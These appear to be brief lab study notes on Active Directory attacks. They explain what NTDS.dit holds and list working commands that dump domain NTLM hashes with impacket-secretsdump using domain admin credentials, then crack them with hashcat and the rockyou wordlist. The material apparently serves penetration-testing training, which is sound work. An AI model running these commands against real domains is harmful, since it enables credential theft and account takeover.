- What is NTDS.dit?
	- Database used to **==store AD data==**:
		- **User Information**
		- Group Information
		- Security Descriptors
		- **Passwords Hashes** : )

- **We created `hawkeye` domain admin user:**
---
- `impacket-secretsdump MARVEl.local/hawkeye:'Password1@'@10.0.1.4 -just-dc-ntlm`
	- `just-dc-ntlm` : Self explanatory :)
- ![[Pasted image 20250330151828.png]]
# Cracking the hashes
---
- To crack, we only need the **NT part (later part)**
	- Store in a file, let's say `NTLM_hashes.txt`
	- `cat NTLM_hashes.txt | cut -d ":" -f4 > hashes.txt`
	- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`
	- `hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --show`
	- ![[Pasted image 20250330152511.png]]